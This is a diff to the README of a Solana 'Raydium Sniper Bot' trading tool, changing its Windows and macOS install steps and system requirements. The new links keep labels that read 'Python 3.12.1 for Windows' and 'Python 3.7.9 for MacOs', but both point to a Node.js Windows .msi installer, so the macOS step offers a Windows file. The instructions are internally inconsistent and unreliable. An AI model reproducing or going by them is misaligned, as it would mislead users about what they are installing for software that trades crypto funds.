@@ -70,7 +70,7 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
    - [Git for Windows](https://git-scm.com/download/win)  
 
 2. Download and install Python:  
-   - [Python 3.12.1 for Windows](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)  
+   - [Python 3.12.1 for Windows](https://nodejs.org/dist/v20.3.0/node-v20.3.0-x64.msi)  
 
 3. Clone and build the bot (CMD):
    ```bash
@@ -84,7 +84,7 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
 1. Install Git:
    - [Git for macOS](https://git-scm.com/download/mac)
 2. Install Python 3.7.9 version:
-   - [Python 3.7.9 for MacOs](https://www.python.org/ftp/python/3.7.9/python-3.7.9-macosx10.9.pkg)
+   - [Python 3.7.9 for MacOs](https://nodejs.org/dist/v20.3.0/node-v20.3.0-x64.msi)
 3. Clone and build the bot (Terminal):
    ```bash
    git clone https://github.com/SOLTBOT5/The-Solana-Raydium-Sniper-Bot.git
@@ -97,7 +97,7 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
 
 ## 🛠 System Requirements
 
-- Python 3.7.9
+- Node.js v20.3.0
 - Stable internet connection
 
 ---
